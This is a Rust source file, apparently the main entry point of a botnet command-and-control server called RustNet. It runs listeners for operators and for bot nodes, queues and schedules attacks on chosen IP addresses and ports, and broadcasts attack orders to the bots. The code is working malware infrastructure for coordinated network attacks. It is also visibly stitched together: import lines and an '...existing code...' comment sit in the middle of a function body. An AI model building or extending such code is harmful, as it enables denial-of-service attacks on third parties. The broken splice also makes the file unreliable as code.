mod modules {
    pub mod auth;
    pub mod client_manager;
    pub mod config;
    pub mod error;
    pub mod validation;
    pub mod bot_manager;
    pub mod attack_manager;
    pub mod tls;
    pub mod rate_limiter;
    pub mod state;
    pub mod commands;
    pub mod connection_handler;
    pub mod database;
}
use tokio::net::TcpListener;
use std::sync::Arc;
use std::time::Duration;
use std::net::IpAddr;
use tracing::{info, warn, error, debug};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
use dashmap::DashSet;
use sqlx::{SqlitePool, Row};
use modules::auth::{Level, random_string, set_title, LoginAttemptTracker, UserManager};
use modules::database::init_database;
use modules::client_manager::ClientManager;
use modules::config::Config;
use modules::error::{CncError, Result};
use modules::bot_manager::BotManager;
use modules::attack_manager::AttackManager;
use modules::rate_limiter::SimpleRateLimiter;
use modules::tls::setup_tls;
use modules::state::AppState;
use modules::connection_handler::{handle_user_connection, handle_bot_connection};
use modules::commands::{registry::CommandRegistry, impls::register_all};
fn get_config_dir() -> std::path::PathBuf {
    let current_dir = std::env::current_dir().unwrap_or_else(|_| std::path::PathBuf::from("."));
    let config_in_current = current_dir.join("config");
    if config_in_current.exists() {
        return config_in_current;
    }
    if current_dir.ends_with("release") || current_dir.ends_with("debug") {
        if let Some(target_dir) = current_dir.parent() {
            if let Some(project_root) = target_dir.parent() {
                let config_path = project_root.join("config");
                if config_path.exists() {
                    return config_path;
                }
            }
        }
    }
    let config_dir = current_dir.join("config");
    if let Err(e) = std::fs::create_dir_all(&config_dir) {
        error!("Failed to create config directory: {}", e);
    }
    config_dir
}
const CLEANUP_INTERVAL: Duration = Duration::from_secs(60);
const BOT_TIMEOUT_SECS: i64 = 30;
#[tokio::main]
async fn main() -> Result<()> {
    let config = Config::load();
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| config.log_level.clone()),
        ))
        .with(tracing_subscriber::fmt::layer())
        .init();
    info!("🦀 RustNet CnC Server v2.0 - Production Ready (Config Update)");
    info!("========================================");
    let config_dir = get_config_dir();
    let _bot_tokens_file = config_dir.join("bot_tokens.json");
    info!("📁 Config directory: {}", config_dir.display());
    if let Err(e) = config.validate() {
        error!("Configuration validation failed: {}", e);
        return Err(CncError::ConfigError(e));
    }
    info!("[OK] Configuration loaded successfully");
    let db_url = format!("sqlite:{}", config_dir.join("rustnet.db").to_string_lossy());
    info!("Initializing database at {}", db_url);
    let db_pool = init_database(&db_url).await?;
    info!("[OK] Database initialized");
    let tls_acceptor = if config.enable_tls {
        info!("Setting up TLS encryption...");
        let strict_mode = config.strict_tls || config.deployment_mode == "public";
        match setup_tls(&config.cert_path, &config.key_path, strict_mode).await {
            Ok(acceptor) => {
                info!("[OK] TLS encryption enabled");
                Some(Arc::new(acceptor))
            }
            Err(e) => {
                error!("Failed to setup TLS: {}", e);
                error!("TLS is required but setup failed. Server cannot start.");
                return Err(e);
            }
        }
    } else {
        error!("=================================================================");
        error!("⛔ FATAL: TLS IS DISABLED");
        error!("This server requires TLS for security. Please enable TLS in config.");
        error!("=================================================================");
        return Err(CncError::ConfigError("TLS is required".to_string()));
    };
    let user_manager = Arc::new(UserManager::new(db_pool.clone()));
    if user_manager.get_user("root").await?.is_none() {
        info!("No root user found, creating root user...");
        let password = random_string(16);
        match user_manager.add_user(
            "root".to_string(),
            &password,
            chrono::Utc::now() + chrono::Duration::days(40000),
            Level::Owner,
        ).await {
            Ok(_) => {
                let creds = format!("Username: root\nPassword: {}\n", password);
                let creds_path = config_dir.join("root_credentials.txt");
                if let Ok(_) = tokio::fs::write(&creds_path, creds).await {
                    warn!("=================================================================");
                    warn!("🔐 ROOT ACCOUNT CREATED");
                    warn!("Credentials saved to: {}", creds_path.display());
                    warn!("DELETE THIS FILE AFTER LOGGING IN!");
                    warn!("=================================================================");
                } else {
                    error!("Failed to save root credentials to file!");
                    warn!("Password: {}", password);
                }
            },
            Err(e) => error!("Failed to create root user: {}", e),
        }
    }
    let blacklist = match load_ip_list(&db_pool, "blacklist").await {
        Ok(list) => list,
        Err(e) => {
            error!("Failed to load blacklist: {}", e);
            return Err(e);
        }
    };
    let whitelist = match load_ip_list(&db_pool, "whitelist").await {
        Ok(list) => list,
        Err(e) => {
            error!("Failed to load whitelist: {}", e);
            return Err(e);
        }
    };
    info!("Loaded {} blacklisted IPs and {} whitelisted IPs", blacklist.len(), whitelist.len());
    let state = Arc::new(AppState::new(
        config.clone(),
        Arc::new(BotManager::new(config.max_bot_connections, db_pool.clone())),
        Arc::new(ClientManager::new(config.max_user_connections)),
        Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs, db_pool.clone())),
        Arc::new(SimpleRateLimiter::new(config.rate_limit_per_minute as usize, db_pool.clone())),
        user_manager,
        tls_acceptor,
        db_pool.clone(),
        Arc::new(LoginAttemptTracker::new(db_pool.clone())),
        whitelist,
        blacklist,
    ));
    let mut registry = CommandRegistry::new();
    register_all(&mut registry);
    let registry = Arc::new(registry);
    state.attack_manager.cleanup_stale_attacks().await;
    let state_clone = state.clone();
    tokio::spawn(async move {
        periodic_cleanup(state_clone).await;
    });
use std::fs::File;
use flate2::write::GzEncoder;
use flate2::Compression;

// ...existing code...

    let _state_clone = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(3600 * 6)); // Every 6 hours
        loop {
            interval.tick().await;
            info!("Starting automated database backup...");
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
            let backup_name = format!("auto_backup_{}.tar.gz", timestamp);
            let backup_dir = std::path::Path::new("backups");
            if !backup_dir.exists() {
                let _ = tokio::fs::create_dir_all(backup_dir).await;
            }
            let backup_path = backup_dir.join(&backup_name);
            
            let backup_task = tokio::task::spawn_blocking(move || -> Result<()> {
                let tar_gz = File::create(backup_path).map_err(|e| CncError::IoError(e))?;
                let enc = GzEncoder::new(tar_gz, Compression::default());
                let mut tar = tar::Builder::new(enc);
                
                if std::path::Path::new("config/rustnet.db").exists() {
                    tar.append_path("config/rustnet.db").map_err(|e| CncError::IoError(e))?;
                }
                if std::path::Path::new("config/server.toml").exists() {
                    tar.append_path("config/server.toml").map_err(|e| CncError::IoError(e))?;
                }
                tar.finish().map_err(|e| CncError::IoError(e))?;
                Ok(())
            });

            match backup_task.await {
                Ok(Ok(_)) => info!("Automated backup completed: {}", backup_name),
                Ok(Err(e)) => error!("Automated backup failed: {}", e),
                Err(e) => error!("Automated backup task panicked: {}", e),
            }
        }
    });

    info!("🌐 Starting User server on {}:{}", config.user_server_ip, config.user_server_port);
    info!("🤖 Starting Node Listener on {}:{}", config.bot_server_ip, config.bot_server_port);
    let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
    let bot_listener = TcpListener::bind(format!("{}:{}", config.bot_server_ip, config.bot_server_port)).await?;
    info!("✓ All servers started successfully");
    info!("========================================");
    let shutdown = async {
        match tokio::signal::ctrl_c().await {
            Ok(()) => {},
            Err(e) => error!("Failed to listen for shutdown signal: {}", e),
        }
    };
    tokio::pin!(shutdown);
    let state_clone = state.clone();
    let title_task = tokio::spawn(async move {
        update_titles(state_clone).await;
    });
    let state_clone = state.clone();
    tokio::spawn(async move {
        loop {
            while let Some(request) = state_clone.attack_manager.process_queue().await {
                match state_clone.attack_manager.start_attack(
                    request.method.clone(),
                    request.ip,
                    request.port,
                    request.duration_secs,
                    request.username.clone(),
                    request.user_level,
                    request.bot_count
                ).await {
                    Ok(id) => {
                        info!("Started queued attack {} for user {}", id, request.username);
                        state_clone.bot_manager.broadcast_attack(id, &request.method, &request.ip.to_string(), request.port, request.duration_secs).await;
                    }
                    Err(e) => {
                        warn!("Failed to start queued attack: {}", e);
                    }
                }
            }
            state_clone.attack_manager.wait_for_queue().await;
        }
    });

    let state_clone = state.clone();
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(60));
        loop {
            interval.tick().await;
            state_clone.attack_manager.process_scheduled_attacks().await;
        }
    });

    let state_clone = state.clone();
    let registry_clone = registry.clone();
    let user_task = tokio::spawn(async move {
        loop {
            match user_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("👤 User connection from {}", addr);
                    let state = state_clone.clone();
                    let registry = registry_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_user_connection(conn, addr.to_string(), state, registry).await {
                            error!("User connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting user connection: {}", e),
            }
        }
    });
    let state_clone = state.clone();
    let bot_task = tokio::spawn(async move {
        loop {
            match bot_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("🤖 Node connection from {}", addr);
                    let state = state_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_bot_connection(conn, addr, state).await {
                            error!("Node connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting node connection: {}", e),
            }
        }
    });
    tokio::select! {
        _ = shutdown => {
            info!("🛑 Shutdown signal received, gracefully shutting down...");
            title_task.abort();
        }
        _ = user_task => {
            error!("User server task terminated unexpectedly");
        }
        _ = bot_task => {
            error!("Node server task terminated unexpectedly");
        }
    }
    info!("📊 Final statistics:");
    info!("   Nodes: {}", state.bot_manager.get_bot_count().await);
    info!("   Clients: {}", state.client_manager.get_client_count().await);
    info!("   Ongoing attacks: {}", state.attack_manager.get_active_count().await);
    info!("✓ Server shutdown complete");
    Ok(())
}
async fn periodic_cleanup(state: Arc<AppState>) {
    let mut interval = tokio::time::interval(CLEANUP_INTERVAL);
    loop {
        interval.tick().await;
        state.attack_manager.cleanup_finished().await;
        state.bot_manager.cleanup_dead_bots(BOT_TIMEOUT_SECS).await;
        state.client_manager.cleanup_inactive(state.config.read().await.session_timeout_secs).await;
        state.rate_limiter.cleanup_old_entries().await;
        state.login_tracker.cleanup_old_attempts().await;
        let bot_count = state.bot_manager.get_bot_count().await;
        let client_count = state.client_manager.get_client_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        debug!("Cleanup: {} nodes, {} clients, {} attacks", bot_count, client_count, attack_count);
    }
}
async fn update_titles(state: Arc<AppState>) {
    let spin_chars = ['∴', '∵'];
    let mut spin_index = 0;
    loop {
        tokio::time::sleep(Duration::from_secs(5)).await;
        let clients = state.client_manager.get_all_clients().await;
        if clients.is_empty() { continue; }

        let bot_count = state.bot_manager.get_bot_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        for client in clients {
            let title = format!(
                "    [{}]  Nodes: {} | Attacks: {}/{} |  ☾☼☽  | User: {} ({}) [{}]",
                spin_chars[spin_index],
                bot_count,
                attack_count,
                state.config.read().await.max_attacks,
                client.user.username,
                client.user.get_level().to_str(),
                spin_chars[spin_index]
            );
            let title_seq = set_title(&title);
            let _ = client.try_write(title_seq.as_bytes()).await;
        }
        spin_index = (spin_index + 1) % spin_chars.len();
    }
}
async fn load_ip_list(pool: &SqlitePool, table: &str) -> Result<DashSet<IpAddr>> {
    if table != "blacklist" && table != "whitelist" {
        return Err(CncError::ConfigError("Invalid table name for IP list".to_string()));
    }
    let set = DashSet::new();
    let query = format!("SELECT ip FROM {}", table);
    let rows = sqlx::query(&query).fetch_all(pool).await.map_err(|e| CncError::DatabaseError(e))?;
    for row in rows {
        if let Ok(ip_str) = row.try_get::<String, _>("ip") {
            if let Ok(ip) = ip_str.parse::<IpAddr>() {
                set.insert(ip);
            }
        }
    }
    Ok(set)
}
